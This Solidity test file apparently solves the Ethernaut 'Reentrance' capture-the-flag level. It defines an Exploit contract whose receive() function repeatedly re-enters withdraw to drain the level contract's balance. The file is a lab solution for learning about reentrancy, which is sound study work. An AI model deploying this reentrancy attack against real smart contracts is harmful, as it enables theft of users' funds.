// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value: insertCoin}(true));
        level = Reentrance(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, insertCoin);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // The goal is to drain the level contract of all its funds
        // Here I neew to create an exploiter contract, which would call withdraw on the level contract every time it receive money until level contract is empty

        vm.startPrank(player, player);

        // Deploy the exploiter contract
        uint256 levelBalance = address(level).balance;
        Exploit exploit = new Exploit(level, levelBalance);

        // Donate to the exploiter contract
        exploit.donate{value: levelBalance}();

        // Withdraw funds and trigger receive() loop
        exploit.withdraw();

        vm.stopPrank();
    }
}

contract Exploit {
    Reentrance level;
    uint256 amount;

    constructor(Reentrance _level, uint256 _amount) public {
        level = _level;
        amount = _amount;
    }

    function donate() public payable {
        level.donate{value: msg.value}(address(this));
    }

    function withdraw() public {
        level.withdraw(amount);
    }

    receive() external payable {
        if (address(level).balance >= amount) {
            withdraw();
        }
    }
}
